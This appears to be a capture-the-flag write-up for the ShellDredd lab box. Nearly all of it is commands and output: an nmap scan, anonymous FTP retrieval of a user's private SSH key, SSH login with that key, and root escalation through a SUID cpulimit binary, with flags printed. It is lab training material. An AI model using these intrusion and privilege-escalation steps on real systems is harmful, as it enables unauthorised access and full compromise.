-> I started by enumerating the machine
```
┌──(root㉿kali)-[/home/astra]
└─# nmap -p- --min-rate 10000 -Pn -sV 192.168.189.130

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 09:06 EST
Nmap scan report for 192.168.189.130
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
```
-> Didn't find much, so I try to login to the ftp using anonymous
```
┌──(root㉿kali)-[/home/astra]
└─# ftp 192.168.189.130

Connected to 192.168.189.130.
220 (vsFTPd 3.0.3)
Name (192.168.189.130:astra): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||6612|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||11263|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||32516|)
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
100% |***********************************************************************************************************|  1823        8.64 MiB/s    00:00 ETA
226 Transfer complete.
1823 bytes received in 00:00 (13.57 KiB/s)
ftp> exit
221 Goodbye.
```
-> Here I found an user called hannah that had an id_rsa, allowing me to connect ssh and get the first flag                
```
┌──(root㉿kali)-[/home/astra]
└─# chmod 600 id_rsa 
                                                                                                                                                        
┌──(root㉿kali)-[/home/astra]
└─# ssh hannah@192.168.189.130 -i id_rsa -p 61000

The authenticity of host '[192.168.189.130]:61000 ([192.168.189.130]:61000)' can't be established.
ED25519 key fingerprint is SHA256:6tx3ODoidGvtQl+T9gJivu3xnndw7PXje1XLn+lZuSM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.189.130]:61000' (ED25519) to the list of known hosts.
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ ls  
local.txt  user.txt
hannah@ShellDredd:~$ cat local.txt 
4b60792fff07d9c593515a95f28da053
hannah@ShellDredd:~$ 
```

-> Now I need to escalate privileges, I start it by doing a search for files with SUID permission
```
hannah@ShellDredd:~$ find / -perm -4000 2>/dev/null

/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd
hannah@ShellDredd:~$ 
```
-> I see "cpulimit" and I think we can exploit that, after searching the web for a while I found this

![Screenshot_2](https://user-images.githubusercontent.com/47869173/220662365-ff298f81-c187-4c5f-affa-50ec0bbd5fce.png)


We can use this to get root access, so lets get to it
```
hannah@ShellDredd:~$ /usr/bin/cpulimit -l 100 -f -- /bin/sh -p
Process 1247 detected
# whoami
root
# 
```
-> Done, now we get the root flag 
```
# cd root
# ls
proof.txt  root.txt
# cat proof.txt
9dc861ef08a1562bea36e2fce7803869
# 
```
-> Thats it !

